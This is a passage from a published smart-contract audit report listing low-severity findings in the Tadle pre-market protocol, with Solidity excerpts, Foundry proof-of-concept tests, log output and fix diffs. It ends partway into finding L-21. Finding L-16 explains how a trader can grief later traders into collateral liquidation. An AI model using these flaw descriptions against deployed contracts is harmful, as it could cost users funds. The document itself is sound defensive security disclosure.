        vm.stopPrank();

        address _marketPlace = GenerateAddress.generateMarketPlaceAddress(
            "Backpack"
        );
        MarketPlaceInfo memory info = systemConfig.getMarketPlaceInfo(
            _marketPlace
        );
        assertEq(uint(info.status), uint(MarketPlaceStatus.AskSettling));
        vm.startPrank(user);
        deliveryPlace.closeBidOffer(offerAddr);
        vm.stopPrank();
    }
```

Run With Command : `forge test --mt test_Close_Bid_Offer_In_AskSettling`

## Impact

The offer owner is currently allowed to close a bid offer even when the market is in the `AskSettling` status. However, `AskSettling` is intended for settling Ask Offers, not Bid Offers. Tadle also maintains specific time frames for each market state.

## Tools Used

Manual Review

## Recommendations

Remove `AskSettling` check for if condition :

```diff
@@ -49,7 +49,6 @@ contract DeliveryPlace is DeliveryPlaceStorage, Rescuable, IDeliveryPlace {
         }
 
         if (
-            status != MarketPlaceStatus.AskSettling &&
             status != MarketPlaceStatus.BidSettling
```

## <a id='L-12'></a>L-12. Trade tax and settled collateral amount are not updated in offer struct

_Submitted by [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [josh4324](https://profiles.cyfrin.io/u/josh4324), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [audinarey](https://profiles.cyfrin.io/u/audinarey). Selected submission by: [robertodf99](https://profiles.cyfrin.io/u/robertodf99)._      
            


## Summary
The `OfferInfo` struct contains various elements, including two fields specifically intended to store the trade tax charged and the amount of collateral settled:

```javascript
struct OfferInfo {
    uint256 id;
    address authority;
    address maker;
    OfferStatus offerStatus;
    OfferType offerType;
    AbortOfferStatus abortOfferStatus;
    uint256 points;
    uint256 amount;
    uint256 collateralRate;
    uint256 usedPoints;
@>  uint256 tradeTax;
    uint256 settledPoints;
    uint256 settledPointTokenAmount;
@>  uint256 settledCollateralAmount;
}
```
However, neither of these two fields is updated at any time.

## Vulnerability Details
When users query information using the `PreMarkets::getOfferInfo` getter function, they receive incorrect data. This discrepancy can impact frontend functionalities.

## Impact
See PoC below:

```javascript
    function test_offer_params_not_updated() public {
        vm.startPrank(user);

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.createTaker(offerAddr, 500);
        vm.stopPrank();

        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        vm.startPrank(user);
        mockPointToken.approve(address(tokenManager), type(uint256).max);
        deliveryPlace.settleAskMaker(offerAddr, 500);

        OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr);
        assertEq(offerInfo.tradeTax, 0);
        assertEq(offerInfo.settledCollateralAmount, 0);
    }
```

## Tools Used
Manual review.

## Recommendations
Ensure that the trade tax is updated when the taker accepts the offer. Similarly, update the settled collateral when it is returned, such as when the offer is either closed or settled.
## <a id='L-13'></a>L-13. `PreMarket::createTaker` Should Update the `offerInfo.offerStatus` According to `amount usedPoints`

_Submitted by [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [4lifemen](https://profiles.cyfrin.io/u/4lifemen), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [audinarey](https://profiles.cyfrin.io/u/audinarey), [amaron](https://profiles.cyfrin.io/u/amaron), [iamthesvn](https://profiles.cyfrin.io/u/iamthesvn). Selected submission by: [4rdiii](https://profiles.cyfrin.io/u/4rdiii)._      
            


# [L-01] `PreMarket::createTaker` Should Update the `offerInfo.offerStatus` According to `amount usedPoints`
## Summary
The `offerStatus` enum in the `PreMarket` contract has several statuses to indicate the state of an offer. However, the `createTaker` function does not update the `offerInfo.offerStatus` based on whether at least one trade has happened or if all points in an order are used. This oversight contradicts the documentation and NATSPEC, which specify that `offerStatus` should be set to `Ongoing` when at least one trade has occurred or `Filled` if all points in an order are used.
## Vulnerability Details
The `offerInfo.offerStatus` is crucial for users to understand the availability and state of an offer. Despite this, the `createTaker` function does not update the `offerInfo.offerStatus` at any point during its execution, even though it modifies the `usedPoints`.
```javascript
/**
 * @dev Offer status
 * @notice Unknown, Virgin, Ongoing, Canceled, Filled, Settling, Settled
 * @param Unknown offer not yet exist.
 * @param Virgin offer has been listed, but not one trade.
 * @param Ongoing offer has been listed, and already one trade.
 * @param Canceled offer has been canceled.
 * @param Filled offer has been filled.
 * @param Settling offer is settling.
 * @param Settled offer has been settled, the last status.
 */
enum OfferStatus {
    Unknown,
    Virgin,
@>  Ongoing,
    Canceled,
@>  Filled,
    Settling,
    Settled
}
```
The `createTaker` function should update the `offerInfo.offerStatus` after updating the `usedPoints` according to the `usedPoints` value.
```javascript
function createTaker(address _offer, uint256 _points) external payable {
        .
        .
        .

@>      offerInfo.usedPoints = offerInfo.usedPoints + _points;
@>      //e Missing logic to update offerStatus

        stockInfoMap[stockAddr] = StockInfo({
            id: offerId,
            stockStatus: StockStatus.Initialized,
            stockType: offerInfo.offerType == OfferType.Ask
                ? StockType.Bid
                : StockType.Ask,
            authority: _msgSender(),
            maker: offerInfo.maker,
            preOffer: _offer,
            points: _points,
            amount: depositAmount,
            offer: address(0x0)
        });

        offerId = offerId + 1;
        uint256 remainingPlatformFee = _updateReferralBonus(
            platformFee,
            depositAmount,
            stockAddr,
            makerInfo,
            referralInfo,
            tokenManager
        );
        makerInfo.platformFee = makerInfo.platformFee + remainingPlatformFee;

        _updateTokenBalanceWhenCreateTaker(
            _offer,
            tradeTax,
            depositAmount,
            offerInfo,
            makerInfo,
            tokenManager
        );

        /// @dev emit CreateTaker
        emit CreateTaker(
            _offer,
            msg.sender,
            stockAddr,
            _points,
            depositAmount,
            tradeTax,
            remainingPlatformFee
        );
    }
```
## Impact
Users may attempt to interact with offers that are marked as `Virgin` or `Unknown` but are actually `Filled` or `Ongoing`, leading to potential reverts. This issue undermines the reliability of the contract's documentation and NATSPEC, potentially causing confusion among users.

## Tools Used
Manual Review

## Recommendations
The `createTaker` function should explicitly update the `offerInfo.offerStatus` based on the `usedPoints` to accurately reflect the offer's state. Here's how the corrected function might look:
```diff
function createTaker(address _offer, uint256 _points) external payable {
        .
        .
        .

        offerInfo.usedPoints = offerInfo.usedPoints + _points;

+       if (offerInfo.usedPoints == offerInfo.points){
+           offerInfo.offerStatus = OfferStatus.Filled;
+       }else{
+           offerInfo.offerStatus = OfferStatus.Ongoing;
+       }

        stockInfoMap[stockAddr] = StockInfo({
            id: offerId,
            stockStatus: StockStatus.Initialized,
            stockType: offerInfo.offerType == OfferType.Ask
                ? StockType.Bid
                : StockType.Ask,
            authority: _msgSender(),
            maker: offerInfo.maker,
            preOffer: _offer,
            points: _points,
            amount: depositAmount,
            offer: address(0x0)
        });

        offerId = offerId + 1;
        uint256 remainingPlatformFee = _updateReferralBonus(
            platformFee,
            depositAmount,
            stockAddr,
            makerInfo,
            referralInfo,
            tokenManager
        );
        makerInfo.platformFee = makerInfo.platformFee + remainingPlatformFee;

        _updateTokenBalanceWhenCreateTaker(
            _offer,
            tradeTax,
            depositAmount,
            offerInfo,
            makerInfo,
            tokenManager
        );

        /// @dev emit CreateTaker
        emit CreateTaker(
            _offer,
            msg.sender,
            stockAddr,
            _points,
            depositAmount,
            tradeTax,
            remainingPlatformFee
        );
    }
```
## <a id='L-14'></a>L-14. Maker's stock status not updated.

_Submitted by [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [josh4324](https://profiles.cyfrin.io/u/josh4324). Selected submission by: [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r)._      
            


## Summary

Maker's stock status not updated.

## Vulnerability Details

In `abortAskOffer`, `closeBidOffer` and `settleAskMaker`, only the maker's offer status is updated, and the maker's stock status is not updated.

<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L78-L79>

```Solidity
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        perMarkets.updateOfferStatus(_offer, OfferStatus.Settled);
```

<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L309-L314>

```Solidity
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        perMarkets.settledAskOffer(
            _offer,
            _settledPoints,
            settledPointTokenAmount
        );
```

<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L631-L632>

```Solidity
        offerInfo.abortOfferStatus = AbortOfferStatus.Aborted;
        offerInfo.offerStatus = OfferStatus.Settled;
```

This means that the maker's stock status remains `Initialized`, while it should actually be set to `Finished` like the taker.

```Solidity
        perMarkets.updateStockStatus(_stock, StockStatus.Finished);
```

## Impact

Maker's stock status not updated.

## Tools Used

vscode

## Recommendations

Set \`Finished\` in the end.

## <a id='L-15'></a>L-15. When the `DeliveryPlace::settleAskMaker()` function calls `tokenManager.addTokenBalance()` to update the user balance, the `TokenBalanceType` parameter uses an operation, resulting in a balance update error

_Submitted by [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [eeyore](https://profiles.cyfrin.io/u/eeyore), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [rbserver](https://profiles.cyfrin.io/u/rbserver). Selected submission by: [joicygiore](https://profiles.cyfrin.io/u/joicygiore)._      
            


## Summary

When the `DeliveryPlace::settleAskMaker()` function calls `tokenManager.addTokenBalance()` to update the user balance, the `TokenBalanceType` parameter uses an operation, resulting in a balance update error

## Vulnerability Details

The source code snippet of the `DeliveryPlace::settleAskMaker()` function is as follows. As marked by `@>`, `TokenBalanceType` is used incorrectly.

```js
    function settleAskMaker(address _offer, uint256 _settledPoints) external {
        
        // SNIP...

@>        uint256 makerRefundAmount;
        if (_settledPoints == offerInfo.usedPoints) {
            if (offerInfo.offerStatus == OfferStatus.Virgin) {
                makerRefundAmount = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    offerInfo.amount,
                    true,
                    Math.Rounding.Floor
                );
            } else {
                uint256 usedAmount = offerInfo.amount.mulDiv(
                    offerInfo.usedPoints,
                    offerInfo.points,
                    Math.Rounding.Floor
                );


                makerRefundAmount = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    usedAmount,
                    true,
                    Math.Rounding.Floor
                );
            }


            tokenManager.addTokenBalance(
@>                TokenBalanceType.SalesRevenue,
                _msgSender(),
                makerInfo.tokenAddress,
@>                makerRefundAmount
            );
        }

        // SNIP...
    }
```

### Poc

To demonstrate the issue, add the following test code to `test/PreMarkets.t.sol` and run it:

```js
    function testAskPointAndAmount() public {
        ///////////////////////////
        // user create Bid.Offer //
        ///////////////////////////
        vm.prank(user);
        // transfer mockUSDCToken 1e16 to capitalPool
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000, 
                0.01 * 1e18, 
                12000, 
                300, 
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        
        // Cache user's offer address
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        ////////////////////////
        // user2 create Taker //
        ////////////////////////
        vm.prank(user2);
        // transfer mockUSDCToken 1.235e16 to capitalPool
        preMarktes.createTaker(offerAddr, 1000);

        // Cache user2's stock address
        address user2StockAddr = GenerateAddress.generateStockAddress(1);
        

        ////////////////////////
        // admin updateMarket //
        ////////////////////////
        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        //////////////////////////
        // user settleAskMaker  //
        //////////////////////////       
        vm.startPrank(user);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);

        // transfer mockPointToken 1e19 to capitalPool
        deliveryPlace.settleAskMaker(offerAddr, 1000);
        vm.stopPrank();

        //////////////////////////
        // user2 closeBidTaker  //
        //////////////////////////   
        vm.prank(user2);
        deliveryPlace.closeBidTaker(user2StockAddr);
        //////////////////////////
        //  check user balance  //
        //////////////////////////
        // user
        console2.log("--------------- user balance ---------------");
        balanceHelper(user);
    }
    // helper
    function balanceHelper(address _user) view public {
        uint256 usermockUSDCTokenAmount_TaxIncome = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.TaxIncome
        );
        console2.log("usermockUSDCTokenAmount_TaxIncome:",usermockUSDCTokenAmount_TaxIncome);
        uint256 usermockUSDCTokenAmount_ReferralBonus = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.ReferralBonus
        );
        console2.log("usermockUSDCTokenAmount_ReferralBonus:",usermockUSDCTokenAmount_ReferralBonus);
        uint256 usermockUSDCTokenAmount_SalesRevenue = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.SalesRevenue
        );
        console2.log("usermockUSDCTokenAmount_SalesRevenue:",usermockUSDCTokenAmount_SalesRevenue);
        uint256 usermockUSDCTokenAmount_RemainingCash = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.RemainingCash
        );
        console2.log("usermockUSDCTokenAmount_RemainingCash:",usermockUSDCTokenAmount_RemainingCash);
        uint256 usermockUSDCTokenAmount_MakerRefund = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
        console2.log("usermockUSDCTokenAmount_MakerRefund:",usermockUSDCTokenAmount_MakerRefund);
        uint256 usermockUSDCTokenAmount_PointToken = tokenManager.userTokenBalanceMap(
            address(_user),
            address(mockUSDCToken),
            TokenBalanceType.PointToken
        );
        console2.log("usermockUSDCTokenAmount_PointToken:",usermockUSDCTokenAmount_PointToken);
    }
```

From the following output, we can see that `userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.SalesRevenue] == 22000000000000000(2.2e16)`, while the actual values ​​should be `userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.SalesRevenue] == 1e16` and `userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.MakerRefund] == 1.2e16`

```zsh
[PASS] testAskPointAndAmount() (gas: 1172769)
Logs:
  --------------- user balance ---------------
  usermockUSDCTokenAmount_TaxIncome: 300000000000000
  usermockUSDCTokenAmount_ReferralBonus: 0
@>  usermockUSDCTokenAmount_SalesRevenue: 22000000000000000
  usermockUSDCTokenAmount_RemainingCash: 0
@>  usermockUSDCTokenAmount_MakerRefund: 0
  usermockUSDCTokenAmount_PointToken: 0
```

### Code Snippet

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L222-L325>

## Impact

The source code snippet of the `DeliveryPlace::settleAskMaker()` function is as follows. As marked by `@>`, `TokenBalanceType` is used incorrectly.

## Tools Used

Manual Review

## Recommendations

```diff
        tokenManager.addTokenBalance(
+            TokenBalanceType.MakerRefund,
-            TokenBalanceType.SalesRevenue, 
            _msgSender(),
            makerInfo.tokenAddress,
            makerRefundAmount
        );
```

test again:

```zsh
[PASS] testAskPointAndAmount() (gas: 1224694)
Logs:
  --------------- user balance ---------------
  usermockUSDCTokenAmount_TaxIncome: 300000000000000
  usermockUSDCTokenAmount_ReferralBonus: 0
@>  usermockUSDCTokenAmount_SalesRevenue: 10000000000000000
  usermockUSDCTokenAmount_RemainingCash: 0
@>  usermockUSDCTokenAmount_MakerRefund: 12000000000000000
  usermockUSDCTokenAmount_PointToken: 0
```

## <a id='L-16'></a>L-16. High risk of griefing attack during settlement period in Protected mode

_Submitted by [touthang](https://profiles.cyfrin.io/u/touthang), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [meeve](https://profiles.cyfrin.io/u/meeve). Selected submission by: [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2)._      
            


## Summary

In Protected Mode, higher-ranked traders in the settlement process can delay their point settlements until the end of the settlement period, preventing subsequent traders from settling their points, and leading to forced collateral liquidation that cascades down the trading sequence, causing financial loss to subsequent traders.

## Vulnerability Details

In Protected Mode, all sellers, whether they are the original or subsequent ones, are required to deposit crypto as collateral. Upon settlement, **each seller must transfer tokens to the buyer according to the trading sequence**, as [outlined in the documentation](https://tadle.gitbook.io/tadle/how-tadle-works/mechanics-of-tadle/protected-mode). Ask-offer settlements occur within a specified [windowed period](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/libraries/MarketPlaceLibraries.sol#L41-L43) before bidding settlements starts; when the market status is `AskSettling`.

The issue is that malicious ask-offers higher up in the trading sequence can delay their point settlements until the very end of the settlement period, potentially by front-running `updateMarket` transactions when the owner sets the TGE event. As a result, traders in the middle of the sequence, who still need to settle points with subsequent traders, may not receive the necessary points in time. This delay prevents them from settling within the designated settlement period, forcing the owner to call `settleAskTaker` to [forcefully settle their offers](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263) and subsequent traders trigger the liquidation of collateral through the `closeBidTaker` function to get refunded with the token points they did not receive:

```solidity
function closeBidTaker(address _stock) external {
    //...
    (
        OfferInfo memory preOfferInfo,
        MakerInfo memory makerInfo,
        ,

    ) = getOfferInfo(stockInfo.preOffer);

    OfferInfo memory offerInfo;
    uint256 userRemainingPoints;
        
    if (makerInfo.offerSettleType == OfferSettleType.Protected) {
        offerInfo = preOfferInfo;
        userRemainingPoints = stockInfo.points;     
    }else {// ...} 

    // ...
    uint256 collateralFee;
    if (offerInfo.usedPoints > offerInfo.settledPoints) {
        if (offerInfo.offerStatus == OfferStatus.Virgin) {// ...
        } else {
            uint256 usedAmount = offerInfo.amount.mulDiv(
                offerInfo.usedPoints,
                offerInfo.points,
                Math.Rounding.Floor
            );

            collateralFee = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                usedAmount,
                true,
                Math.Rounding.Floor
            );
        }
    }
    uint256 userCollateralFee = collateralFee.mulDiv(
        userRemainingPoints,
        offerInfo.usedPoints, 
        Math.Rounding.Floor
    );

    tokenManager.addTokenBalance(
        TokenBalanceType.RemainingCash,
        _msgSender(),
        makerInfo.tokenAddress,
        userCollateralFee
    );

    // ...
}
```

As seen above, in the  `Protected` Mode, if ask-offers do not settle their points, their collateral will be liquidated and distributed to the offer takers.

This liquidation can cascade down the trading sequence, as subsequent traders who are unable to settle their points will also have their collateral liquidated.

## Proof Of Concept

Consider the following example:

1. **Alice**, the initial market maker, lists `1,000` points for sale at $1 per unit and deposits $1,000 as collateral, \*\*with `Protected` mode
2. **Bob** buys 500 points from **Alice** for \$500. This amount is credited to Alice's balance and is available for withdrawal.
3. **Bob**, now a maker, lists the `500` points he purchased at a price of $1.10 per point and deposits $550 as collateral.
4. **Dany** buys `500` points from **Bob** at $1.10 per unit, paying $550. This amount is credited to Bob's balance and is available for withdrawal.

As the owner updates the market and sets the TGE, the market enters the AskSettling period:

1. **Alice** delays settling her points to **Bob** until the very end of the settling period.
   * Notice that **Bob** cannot settle his points to **Dany** until he receives them from Alice.
2. **Bob** eventually receives the token points from Alice's settlement but cannot settle them to **Dany** because the settlement period has ended, and the market has now entered the `BidSettling` phase.
3. The owner will [call `settleAskMaker`](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263) to forcefully settle Bob's offer.
4. Since **Dany** did not receive the token points from **Bob**, she calls `closeBidTaker` to claim a refund from Bob's collateral.

Notice that if **Dany** herself has points to settle to subsequent traders, the liquidation will continue cascading down through the trading sequence.

## Impact

Malicious traders in the trading sequence can delay settling their points until the very end of the settlement period, preventing subsequent traders from settling their points. This leads to the liquidation of collateral for those traders, allowing the malicious traders to cause cascading collateral liquidation.

## Tools Used

Manual Review

## Recommendations

The root cause of this issue is that settlements must occur according to the trading sequence, which is essential in Protected Mode. To mitigate this risk, one solution could be to implement a settlement period for each trader in the trading sequence. This approach would prevent griefing attacks by ensuring that each trader has an appropriate window to settle their points.

## <a id='L-17'></a>L-17. 3 `OfferStatus` are never used, and code seems to have contradicting intentions

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [amaron](https://profiles.cyfrin.io/u/amaron), [_frolic](https://profiles.cyfrin.io/u/_frolic), [demorextess](https://profiles.cyfrin.io/u/demorextess), [audinarey](https://profiles.cyfrin.io/u/audinarey). Selected submission by: [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful)._      
            


## Summary 📌

There are several issues and inconsistenies that arise from the way the protocol uses the `OfferStatus` enum.

Due to lack of answers from devs, incomplete documentation that contradicts the code sometimes, and even the same code that seems to mean different things. It is hard to determine if some of the issues are real or not.

There are 3 [OfferStatus](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/storage/OfferStatus.sol#L15) not used at all: `Filled`, `Settling` and `Ongoing`. And the `Virgin` status is wrongly applied according to its definition.

The inorrect use of `Virgin` is for sure an issue and I've submitted it separately from this one. This one showcases issuees that can be derived from the lack of use of the other 3 states. Yet due to the ambiguity of the codebase, it is hard to determine if all arising issues are intended or not. Just in case, here I report them.

---

## Vulnerability Details 🔍 && Impact 📈

`Filled`, `Settling` and `Ongoing` offer statuses are never used. Due to lack of complete documentantion respecting this and the devs not answering questions probably due to an overload of them, I can't deide on time if this has been intentional or an oversight. Thus the validity of all issues related to the lack of use of this states is not clear. I do think the great ambiguity on the topic should deem as 1 valid collective issue anyway. This part of the protocol about `OfferState` transitions is unauditable because for an audit to be taken you should clearly know what the code is meant to mean and do.

Here is a clear example of the confusion and contradictory information in the codebase:

- Settling in 2-txs is imposible as the `Settling` status is not used. If you partially settle tokens the offer will be marked as `Settled` and revert in future transactions ([here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L243)) that pretend to fully complete settling the offer. The code indicates this is not meant to be allowed but the existance of the `Settling` status indicates it was probably meant to be allowed. This is what I meant by contradictory information due to code actions, meanings and poor documentation which makes the code unauditable as you can't know if this is a valid finding or just intended behavior. Anyway here I report it.

Other errors derived from the lack of usage of these states are the obvious ones:

- `Filled` should be used when all points are sold and it is not (this was said by the dev in a code walktrhough, exactly [here](https://www.youtube.com/watch?v=JLaqo4cBB40&t=1906s)) being used.

- `Ongoing` seems to be intended to be used when only a part of the points are sold, but it is not being used.

---

## Recommendations 🎯

Clearly define what the code is meant to do and mean with every `OfferStatus` defined and then refactor and reaudit the code.

> ℹ️ **Note** 📘 If the inorrect usage of the 3 states is deemed as 3 different issues I would appreciate this issue being deemed as 3 valid ones. Sorry if this is not the correct way of reporting this, this contest is pretty confusing.

---
## <a id='L-18'></a>L-18. Low Severity Issues

_Submitted by [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy)._      
            


# L01: Wrong event emitted when calling settleAskTaker()

## Summary

Incorrect event is emitted when calling `settleAskTaker()`.\
Instead of emitting `SettledAskTaker`, `SettledBidTaker` is emitted.

## Vulnerability Details

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L775>

On line `#775` in `PreMarkets.sol` `SettledBidTaker` is emitted instead of `SettledAskTaker`.

## Impact

Wrong event emitted can lead to inconsistency in off-chain related software.

## Tools Used

Manual review.

## Recommendations

Emit `SettledAskTaker` instead of `SettledBidTaker`.

# L02: Fee on transfer ERC20 collateral tokens can lead to DoS when trying to transfer them

## Summary

Checking for balance before and after transferring tokens is incompatible with ERC20 tokens that implement fee-on-transfer functionality. This is because fee-on-transfer tokens deduct a fee during the transfer process, causing the post-transfer balance to be less than expected. As a result, simple balance checks may incorrectly flag successful transfers as failures, leading to issues in handling such tokens correctly.

## Vulnerability Details

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/TokenManager.sol#L233>

`_transfer()` function in `TokenManager.sol`

```solidity
function _transfer(
        address _token,
        address _from,
        address _to,
        uint256 _amount,
        address _capitalPoolAddr
    ) internal {
        uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
        uint256 toBalanceBef = IERC20(_token).balanceOf(_to);

        if (
            _from == _capitalPoolAddr &&
            IERC20(_token).allowance(_from, address(this)) == 0x0
        ) {
            ICapitalPool(_capitalPoolAddr).approve(address(this));
        }

        _safe_transfer_from(_token, _from, _to, _amount);

        uint256 fromBalanceAft = IERC20(_token).balanceOf(_from);
        uint256 toBalanceAft = IERC20(_token).balanceOf(_to);

        if (fromBalanceAft != fromBalanceBef - _amount) {
            revert TransferFailed();
        }

        if (toBalanceAft != toBalanceBef + _amount) {
            revert TransferFailed();
        }
    }
}
```

## Impact

Some tokens can lead to DoS of the protocol functionality.

## Tools Used

Manual review.

## Recommendations

Instead of strictly comparing `fromBalanceAft` with `fromBalanceBef - _amount`, calculate the actual amount transferred by subtracting `fromBalanceAft` from `fromBalanceBef`. This allows the function to accommodate fee-on-transfer tokens, where the `actualAmountTransferred` might be less than the `_amount`.

Based on the protocol team, accepted fee can be adjusted.

## <a id='L-19'></a>L-19. [H-2] `PreMarkets::createOffer` allows a user to create an offer with `eachTradeTax` more than `Constants.EACH_TRADE_TAX_MAXINUM` allowing the user to even charge 100% of the future sales

_Submitted by [karanel](https://profiles.cyfrin.io/u/karanel), [baz1ka](https://profiles.cyfrin.io/u/baz1ka). Selected submission by: [karanel](https://profiles.cyfrin.io/u/karanel)._      
            


## Relevant Links

<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L39-L157>
<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/libraries/Constants.sol#L20>

## Summary

`PreMarkets::createOffer` allows a user to create an offer with `eachTradeTax` more than `Constants.EACH_TRADE_TAX_MAXINUM`.
The user can even charge `eachTradeTax` of `10_000` (i.e. 100%).

## Vulnerability Details

`eachTradeTax` should not be more than `Constants.EACH_TRADE_TAX_MAXINUM` value i.e. 2000 (20%).
The `PreMarkets::createOffer` only makes sure that the `eachTradeTax` isn't greater than `Constants.EACH_TRADE_TAX_DECIMAL_SCALER` i.e. `10_000`.

```Solidity
        if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
            revert InvalidEachTradeTaxRate();
        }
```

## Impact

Likelihood: High
Impact: High - User can charge a `eachTradeTax` value of more than `EACH_TRADE_TAX_MAXINUM`

Overall severity is High

## Tools Used

Manual Review

## Recommendations

Change the condition in `PreMarkets::createOffer` function

```diff
-       if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
+       if (params.eachTradeTax > Constants.EACH_TRADE_TAX_MAXINUM) {
            revert InvalidEachTradeTaxRate();
        }
```

## <a id='L-20'></a>L-20. `SystemConfig::MarketPlaceInfo.tokenPerPoint` does not take into account the possibility points will be much larger than their equivalent tokens with decimals.

_Submitted by [amaron](https://profiles.cyfrin.io/u/amaron)._      
            


## Summary

if the token that represent the points will have low decimals, and will represent much lower amount than points, the protocol will not be able to provide the real ratio between each point and it's token.

## Vulnerability Details

The `SystemConfig::updateMarket` allows the owners to provide the token address, and the ratio between each point and tokens (`_tokenPerPoint`).

```Solidity
    function updateMarket(
        string calldata _marketPlaceName,
        address _tokenAddress,
        uint256 _tokenPerPoint,
        uint256 _tge,
        uint256 _settlementPeriod
    ) external onlyOwner {
        address marketPlace = GenerateAddress.generateMarketPlaceAddress(_marketPlaceName);

        MarketPlaceInfo storage marketPlaceInfo = marketPlaceInfoMap[marketPlace];

        if (marketPlaceInfo.status != MarketPlaceStatus.Online) {
            revert MarketPlaceNotOnline(marketPlaceInfo.status);
        }

        marketPlaceInfo.tokenAddress = _tokenAddress;
        marketPlaceInfo.tokenPerPoint = _tokenPerPoint;
        marketPlaceInfo.tge = _tge;
        marketPlaceInfo.settlementPeriod = _settlementPeriod;

        emit UpdateMarket(_marketPlaceName, marketPlace, _tokenAddress, _tokenPerPoint, _tge, _settlementPeriod);
    }
```

however אhis is based on the assumption (which is not necessarily correct) that each point represents many more tokens, together with the decimal, for example:
each point represent 1e18 tokens.
however, if the points represent *LESS*  than `tokens * 10 ** token's decimals`, the protocol will not be able to function by the real ratio.

## PoC

let's consider a scenario where a user sells 500,000 points:
Points: 500,000
the token's decimal is 2 (just for simplicity) and the 500,000 points represent 500 tokens.
the 500,000 points are equal to 50 \* 10 \*\* 2 ( which is 50,000);
therefore the `tokenPerPoint` should be 0.1, which can not be passed as an input parameter to

```Solidity
 function updateMarket(
        string calldata _marketPlaceName,
        address _tokenAddress,
        uint256 _tokenPerPoint,
        uint256 _tge,
        uint256 _settlementPeriod
    )
```
and the protocol will not be able to update the ratio.

## Tools Used
manual review

## Recommendations
consider implementing a mechanism in the protocol, where points are being stored together with decimals, then, the ratio can be manipulated with `points` and `tokenPerPoint` to represent the real ratio

## <a id='L-21'></a>L-21. Market Makers via relisting protected offers cannot set their Maker Bonus

_Submitted by [honour](https://profiles.cyfrin.io/u/honour)._      
            


## Summary

Based on information provided by the docs here, the Makers receiver bonuses for providing liquidity. However making a protected offer via `PreMarkets::listOffer` is missing this functionality because there's no way for the maker to specify their maker bonus

## Vulnerability Details

